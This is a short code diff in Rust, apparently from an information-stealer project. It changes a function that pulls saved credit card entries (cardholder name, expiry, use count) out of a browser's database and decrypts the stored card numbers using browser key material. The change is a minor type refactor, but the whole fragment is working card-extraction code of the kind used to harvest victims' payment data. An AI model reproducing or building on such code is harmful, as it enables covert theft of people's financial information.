@@ -44,19 +44,19 @@ impl<C: Collector> Task<C> for CreditCardsTask {
 }
 
 fn extract_card_from_record(record: &dyn TableRecord, browser_data: &BrowserData) -> Option<CreditCard> {
-    let name_on_card = record.get_value(CREDIT_CARDS_NAME_ON_CARD)?.as_string()?.to_owned();
+    let name_on_card = record.get_value(CREDIT_CARDS_NAME_ON_CARD)?.as_str()?.to_owned();
     let expiration_month = record.get_value(CREDIT_CARDS_EXPIRATION_MONTH)?.as_integer()?;
     let expiration_year = record.get_value(CREDIT_CARDS_EXPIRATION_YEAR)?.as_integer()?;
     let use_count = record.get_value(CREDIT_CARDS_USE_COUNT)?.as_integer()?;
     
     let encrypted_card_number = record.get_value(CREDIT_CARDS_CARD_NUMBER)?.as_blob()?;
-    let card_number = unsafe { decrypt_data(encrypted_card_number, browser_data) }?;
+    let card_number = unsafe { decrypt_data(&encrypted_card_number, browser_data) }?;
     
     Some(CreditCard {
         name_on_card,
         expiration_month,
         expiration_year,
-        card_number,
+        card_number: card_number.into(),
         use_count
     })
 }
